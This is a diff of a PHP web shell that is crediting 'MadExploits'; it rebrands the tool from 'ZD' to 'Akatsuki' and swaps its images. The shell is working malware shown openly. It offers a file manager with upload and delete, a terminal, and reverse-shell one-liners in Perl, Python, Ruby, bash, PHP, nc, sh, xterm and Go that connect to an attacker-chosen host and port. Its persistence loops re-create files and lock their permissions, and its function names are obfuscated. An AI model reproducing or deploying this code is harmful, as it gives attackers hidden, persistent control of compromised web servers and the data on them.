@@ -106,7 +106,7 @@ if ($_GET['don'] == true) {
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="robots" content="noindex, nofollow">
     <meta name="googlebot" content="noindex">
-    <title>ZD [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
+    <title>❟❛❟Akatsuki [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
@@ -151,7 +151,7 @@ if ($_GET['don'] == true) {
         .btn-submit,
         .form-file,
         tbody tr:nth-child(2n) {
-            background: url(https://i.postimg.cc/g2zVzhv5/thumb-1920-144565.jpg)norepeat;
+            background: url(https://i.imgur.com/owQAn3Q.jpeg)norepeat;
             bacground-size: 100% 100%;
             background-attachment: fixed;
         }
@@ -181,7 +181,7 @@ if ($_GET['don'] == true) {
         }
 
         body {
-            background: url(https://i.postimg.cc/g2zVzhv5/thumb-1920-144565.jpg);
+            background: url(https://i.imgur.com/owQAn3Q.jpeg);
             background-size: 100% 100%;
             background-attachment: fixed;
             font-family: monospace
@@ -478,7 +478,7 @@ if ($_GET['don'] == true) {
             border-radius: 4px
         }
 
-        .bc-ZD,
+        .bc-❟❛❟Akatsuki,
         .mail,
         .terminal-input {
             background-color: #22242d;
@@ -519,7 +519,7 @@ if ($_GET['don'] == true) {
             margin: 5px 0
         }
 
-        .bc-ZD {
+        .bc-❟❛❟Akatsuki {
             border: none;
             padding: 7px 10px;
             width: 712px;
@@ -533,7 +533,7 @@ if ($_GET['don'] == true) {
             height: 100px
         }
 
-        .logo-ZD {
+        .logo-❟❛❟Akatsuki {
             position: absolute;
             top: -90px;
             right: 40px;
@@ -553,9 +553,9 @@ if ($_GET['don'] == true) {
             <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
             <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
             <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/MadExploits</li>
-            <li class="logo-ZD"><img width="400" height="600" src="https://i.gifer.com/YzDZ.gif" align="right"></li>
+            <li class="logo-❟❛❟Akatsuki"><img width="400" height="600" src="https://i.imgur.com/x68HbJu.png" align="right"></li>
             <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
-                <li class="form-upload"><input type="submit" value="Upload" name="ZD-up-submit" class="btn-submit">&nbsp;<input type="file" name="ZD-upload" class="form-file"></li>
+                <li class="form-upload"><input type="submit" value="Upload" name="❟❛❟Akatsuki-up-submit" class="btn-submit">&nbsp;<input type="file" name="❟❛❟Akatsuki-upload" class="form-file"></li>
             </form>
         </ul>
     </div>
@@ -626,7 +626,7 @@ if ($_GET['don'] == true) {
             </thead>
             <form action="" method="post">
                 <tbody>
-                    <!-- ZD Folder File Manager -->
+                    <!-- ❟❛❟Akatsuki Folder File Manager -->
                     <?php foreach ($file_manager as $_D) : ?>
                         <?php if ($fungsi[2]($_D)) : ?>
                             <tr>
@@ -646,11 +646,11 @@ if ($_GET['don'] == true) {
                             </tr>
                         <?php endif; ?>
                     <?php endforeach; ?>
-                    <!-- ZD Files Manager -->
+                    <!-- ❟❛❟Akatsuki Files Manager -->
                     <?php foreach ($file_manager as $_F) : ?>
                         <?php if ($fungsi[3]($_F)) : ?>
                             <tr>
-                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="ZD-files"><?= namaPanjang($_F); ?></a></td>
+                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="❟❛❟Akatsuki-files"><?= namaPanjang($_F); ?></a></td>
                                 <td><?= formatSize(filesize($_F)); ?></td>
                                 <td>
                                     <?php if (is_writable($fungsi[0]() . '/' . $_D)) {
@@ -669,7 +669,7 @@ if ($_GET['don'] == true) {
                 </tbody>
         </table>
         <br>
-        <select name="ZD-select" class="btn-submit">
+        <select name="❟❛❟Akatsuki-select" class="btn-submit">
             <option value="delete">Delete</option>
             <option value="unzip">Unzip</option>
             <option value="zip">Zip</option><br>
@@ -756,7 +756,7 @@ if ($_GET['don'] == true) {
                 </div>
                 <form action="" method="post">
                     <div class="modal-body">
-                        <select class="bc-ZD box-shadow" name="ZD-bc">
+                        <select class="bc-❟❛❟Akatsuki box-shadow" name="❟❛❟Akatsuki-bc">
                             <option value="-">Choose Backconnect</option>
                             <option value="perl">Perl</option>
                             <option value="python">Python</option>
@@ -1052,23 +1052,23 @@ if (isset($_GET['unlockshell'])) {
 if (isset($_POST['submit-bc'])) {
     $HostServer = $_POST['backconnect-host'];
     $PortServer = $_POST['backconnect-port'];
-    if ($_POST['ZD-bc'] == "perl") {
+    if ($_POST['❟❛❟Akatsuki-bc'] == "perl") {
         echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $fungsi[16] . '("/bin/sh -i");};\'');
-    } else if ($_POST['ZD-bc'] == "python") {
+    } else if ($_POST['❟❛❟Akatsuki-bc'] == "python") {
         echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
-    } else if ($_POST['ZD-bc'] == "ruby") {
+    } else if ($_POST['❟❛❟Akatsuki-bc'] == "ruby") {
         echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;' . $fungsi[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
-    } else if ($_POST['ZD-bc'] == "bash") {
+    } else if ($_POST['❟❛❟Akatsuki-bc'] == "bash") {
         echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
-    } else if ($_POST['ZD-bc'] == "php") {
+    } else if ($_POST['❟❛❟Akatsuki-bc'] == "php") {
         echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');' . $fungsi[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
-    } else if ($_POST['ZD-bc'] == "nc") {
+    } else if ($_POST['❟❛❟Akatsuki-bc'] == "nc") {
         echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
-    } else if ($_POST['ZD-bc'] == "sh") {
+    } else if ($_POST['❟❛❟Akatsuki-bc'] == "sh") {
         echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
-    } else if ($_POST['ZD-bc'] == "xterm") {
+    } else if ($_POST['❟❛❟Akatsuki-bc'] == "xterm") {
         echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
-    } else if ($_POST['ZD-bc'] == "golang") {
+    } else if ($_POST['❟❛❟Akatsuki-bc'] == "golang") {
         echo cmd('echo \'package main;import"os/' . $fungsi[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
     }
 }
@@ -1096,15 +1096,15 @@ while (True){
         $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text') . '"));
         file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", ' . $fungsi[32] . '($text));
     }
-    if (ZD_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
+    if (❟❛❟Akatsuki_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
         chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
     }
-    if (ZD_perm("' . __DIR__ . '") != 0555){
+    if (❟❛❟Akatsuki_perm("' . __DIR__ . '") != 0555){
         chmod("' . __DIR__ . '", 0555);
     }
 }
 
-function ZD_perm($flename){
+function ❟❛❟Akatsuki_perm($flename){
     return substr(sprintf("%o", fileperms($flename)), -4);
 }
 ';
@@ -1116,9 +1116,9 @@ function ZD_perm($flename){
         failed();
     }
 }
-if (isset($_POST['ZD-up-submit'])) {
-    $namaFilenya = $_FILES['ZD-upload']['name'];
-    $tmpName = $_FILES['ZD-upload']['tmp_name'];
+if (isset($_POST['❟❛❟Akatsuki-up-submit'])) {
+    $namaFilenya = $_FILES['❟❛❟Akatsuki-upload']['name'];
+    $tmpName = $_FILES['❟❛❟Akatsuki-upload']['tmp_name'];
     if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
         success();
     } else {
@@ -1181,7 +1181,7 @@ if ($_GET['terminal'] == "root") {
 
 if (isset($_POST['submit-action'])) {
     $items = $_POST['check'];
-    if ($_POST['ZD-select'] == "delete") {
+    if ($_POST['❟❛❟Akatsuki-select'] == "delete") {
         foreach ($items as $it) {
             $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
             $fd = $repl . "/" . $it;
@@ -1197,7 +1197,7 @@ if (isset($_POST['submit-action'])) {
                 }
             }
         }
-    } else if ($_POST['ZD-select'] == 'unzip') {
+    } else if ($_POST['❟❛❟Akatsuki-select'] == 'unzip') {
         foreach ($items as $it) {
             $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
             $fd = $repl . "/" . $it;
@@ -1207,7 +1207,7 @@ if (isset($_POST['submit-action'])) {
                 failed();
             }
         }
-    } else if ($_POST['ZD-select'] == 'zip') {
+    } else if ($_POST['❟❛❟Akatsuki-select'] == 'zip') {
         foreach ($items as $it) {
             $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
             $fd = $repl . "/" . $it;
@@ -1299,15 +1299,15 @@ while (True){
         $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
         file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", ' . $fungsi[32] . '($text));
     }
-    if (ZD_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
+    if (❟❛❟Akatsuki_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
         chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
     } 
-    if (ZD_perm("' . $fungsi[0]() . '") != 0555){
+    if (❟❛❟Akatsuki_perm("' . $fungsi[0]() . '") != 0555){
         chmod("' . $fungsi[0]() . '", 0555);
     }
 }
 
-function ZD_perm($flename){
+function ❟❛❟Akatsuki_perm($flename){
     return substr(sprintf("%o", fileperms($flename)), -4);
 }
 ';
